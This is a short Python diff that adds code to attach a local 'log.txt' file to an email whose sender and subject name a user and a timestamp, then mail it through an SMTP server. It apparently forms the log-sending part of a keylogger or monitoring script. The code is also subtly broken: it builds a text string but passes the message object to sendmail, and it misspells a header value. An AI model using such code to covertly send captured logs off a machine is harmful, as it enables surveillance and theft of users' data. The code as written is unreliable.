@@ -24,3 +24,16 @@ msg = MIMEMultipart()
 msg['From'] = f'{username}-Logs'
 msg['To'] = to
 msg['Subject'] = f'Logging-{username}: {current_time}'
+
+filename = 'log.txt'
+attachment = open(filename, 'rb')
+
+p = MIMEBase('application', 'octet-stream')
+p.set_payload(attachment.read())
+
+encoders.encode_base64(p)
+p.add_header('Content-Disposition', f'attachement; filename={filename}')
+msg.attach(p)
+
+text = msg.as_string()
+server.sendmail(email, to, msg)
